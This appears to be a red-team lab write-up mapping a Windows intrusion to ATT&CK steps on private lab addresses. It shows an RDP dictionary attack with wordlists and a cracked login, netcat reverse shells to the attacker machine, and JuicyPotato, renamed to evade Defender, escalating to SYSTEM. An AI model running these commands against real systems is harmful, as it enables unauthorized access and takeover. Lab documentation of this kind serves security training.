# CASE1

**Attacker :** 192.168.106.141
**Victim :** 192.168.106.142



## STEP1. Initial Access : External Remote Services(T1133)
Using masscan for RDP port scanning and crowbar for Dictionary Attacks to attempt RDP logon.


> Attack Tools : masscan, crowbar
>- masscan - port scanner : https://github.com/robertdavidgraham/masscan
>- Crowbar - Brute forcing tool : https://github.com/galkan/crowbar
>- Support : OpenVPN, Remote Desktop Protocol (RDP) with NLA support, SSH private key authentication, VNC key authentication

### Attacker

![image](https://github.com/user-attachments/assets/f94a5ef2-97ab-4edd-8a95-6144de8257d4)

_[RDP port scan with masscan tool]_


```shell

# masscan 192.168.106.142 -p1025-65535 --rate-1000000

┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# masscan 192.168.106.142 -p30000-30040 --rate-1000000

rate-1000000: empty parameter
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-10 21:32:54 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [41 ports/host]
Discovered open port 30039/tcp on 192.168.106.142

```


![image](https://github.com/user-attachments/assets/d5e815a5-20b5-4d2b-8fbb-6638e739ce00)

_[RDP logon Dictionary Attack with crowbar tool]_


```shell
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# ls
bunny.exe  crowbar  mimikatz.exe  nc64.exe  passlist.txt  userlist.txt
                                                                                                          
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cat userlist.txt 
test
iglootest
testuser
user
admin
administrator
manager
boss
main                                                                                                      
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cat passlist.txt 
qwer1234!
123456
qwer1234
administrator
admin
test
manager
test1234
test1234!
12345678
Administrator                                                                                             
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1]
└─# cd crowbar       
┌──(root㉿kali)-[/home/kali/Attack_Tool/CASE1/crowbar]
└─# ./crowbar.py -b rdp -s 192.168.106.142/32 -U ../userlist.txt -C ../passlist.txt -p 30039
2025-01-10 17:15:30 START
2025-01-10 17:15:30 Crowbar v0.4.3-dev
2025-01-10 17:15:30 Trying 192.168.106.142:30039
2025-01-10 17:15:36 RDP-SUCCESS : 192.168.106.142:30039 - testuser:qwer1234
2025-01-10 17:15:45 STOP

```

> Attack Tools : xfreerdp
> - xfreerdp: https://linux.die.net/man/1/xfreerdp
> - An X11 Remote Desktop Protocol (RDP) client that is part of the FreeRDP project, enabling RDP access in Linux environments.

![image](https://github.com/user-attachments/assets/238f67a0-ac40-46ec-a21f-eddec0fef27f)

_[Connect RDP to xfreerdp]_



![image](https://github.com/user-attachments/assets/a3174dd7-ab96-48c8-a5a7-16bf96dec33e)
_[The victim's credentials don't match ]_



## STEP2. Execution : Command and Scripting Interpreter(T1059)
Download netcat and JuicyPotato Attack Tool on the attacker’s server, establish reverse shell through netcat to remotely execute cmd commands.


### Attacker
```shell
# cd /home/kali/Attacker_Tool/CASE1
# python3 -m http.server 8080

```
### Victim
![image](https://github.com/user-attachments/assets/2855a712-9824-4c9b-aac6-e0417984f23a)
_[ Download netcat and JuicyPotato(bunny.exe) from Attacker server]_


![image](https://github.com/user-attachments/assets/12db89a9-05b9-451b-bece-0faf15d44333)
_[Detection Windows Defender Security Center]_


### Attacker
![image](https://github.com/user-attachments/assets/951621b2-94ba-4249-acbd-77b61b14c48f)
_[Connect reverse shell to 4445 port using netcat(nc64.exe)]_



![image](https://github.com/user-attachments/assets/ffdb0774-7d1a-4878-9dcd-d420fe71727b)
_[ Verify testuser account’s permissions and run cmd with Administrator privilege Enter testuser password stolen by Dictionary Attack ]_


```shell
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4445
listening on [any] 4445 ...
192.168.106.137: inverse host lookup failed: Unknown host
connect to [192.168.106.138] from (UNKNOWN) [192.168.106.137] 50863
Microsoft Windows [Version 10.0.17134.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\testuser>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\testuser>runas /user:Administrator "cmd"
runas /user:Administrator "cmd"
Enter the password for Administrator: 

C:\Users\testuser>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\testuser> Start-Process cmd -Verb RunAs
Start-Process cmd -Verb RunAs
PS C:\Users\testuser> 

```

![image](https://github.com/user-attachments/assets/44e9409f-e927-4d60-8209-a8c826e4d712)
_[Administrator Permission Console(cmd)]_

![image](https://github.com/user-attachments/assets/ebe13ef1-0115-49c3-876e-23cbc4af3d4e)
_[ Check permission 'SeImpersonatePrivilege' for privilege escalation vulnerabilities ]_



```shell
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4445
listening on [any] 4445 ...
192.168.106.137: inverse host lookup failed: Unknown host
connect to [192.168.106.138] from (UNKNOWN) [192.168.106.137] 50877
Microsoft Windows [Version 10.0.17134.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\testuser>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Users\testuser>

```

> Reference : https://learn.microsoft.com/ko-kr/security-updates/security/20214024
> Using Run as
> You can use Run As in a number of different ways, including the following
> To use Run As to start a command shell that uses the domain administrator account credentials
1. Click Start, and then click Run.
2. In the Run dialog box, type runas /user:<domain_name>\administrator cmd, where <domain_name> is your domain name, and then click OK.
3. When a dialog box appears prompting you to enter a password for the domain_name\administrator account, type the administrator account password and press ENTER.
4. A new console window opens, running in administrator context. The console title identifies itself as running as domain_name**\administrator**.



## STEP3. Privilege Escalation : Abuse Elevation Control Mechanism(T1548)
Escalate to SYSTEM privilege using the privilege escalation tool JuicyPotato.


> Attack Tools : JuicyPotato(bunny.exe)

![image](https://github.com/user-attachments/assets/0460906c-9835-4cab-9f32-7ab4386faee0)
_[ Using JuicyPotato(bunny.exe) to steal SYSTEM privilege ]_


```shell
c:\Users\testuser>bunny.exe -l 4445 -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\testuser\nc64.exe -e cmd.exe 192.168.106.138 9999"
bunny.exe -l 4445 -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\testuser\nc64.exe -e cmd.exe 192.168.106.138 9999"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4445
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\testuser>


```



